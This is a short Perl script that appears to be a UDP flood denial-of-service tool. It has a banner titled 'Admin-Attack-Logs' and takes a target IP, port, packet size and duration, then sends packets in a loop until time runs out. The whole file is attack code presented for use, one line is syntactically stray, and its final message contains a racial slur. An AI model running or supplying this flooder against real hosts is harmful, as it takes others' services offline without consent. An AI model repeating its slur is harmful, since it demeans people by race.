

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Usage: \n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);


print BOLD RED<<EOTEXT;
 ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌         ▄▄ • .▄▄ · 
▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██•  ▪     ▐█ ▀ ▪▐█ ▀. 
▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪   ▄█▀▄ ▄█ ▀█▄▄▀▀▀█▄
▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█
 ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀    .▀▀▀  ▀█▄▀▪·▀▀▀▀  ▀▀▀▀ 
 🤡 Admin-Attack-Logs 🤡


EOTEXT

print "
 ╔══════════════════════════╦
   ✗ ipv4: $ip                     
   ✗ port: $port              
   ✗ size: $size              
   ✗ Time: $time             
 ╚══════════════════════════╝\nMade by overfonts!
";
  ($size ? "$size-Slammed" : "65500") . "Bots" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop Attacking With Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+60) ;
  $pport = $port ? $port : int(rand(65500))+100;
 
  send(flood, pack("a$psize","flood"), 100, pack_sockaddr_in($pport, $iaddr));}
  print 'Attack Stopped Nigger';

exit(1);
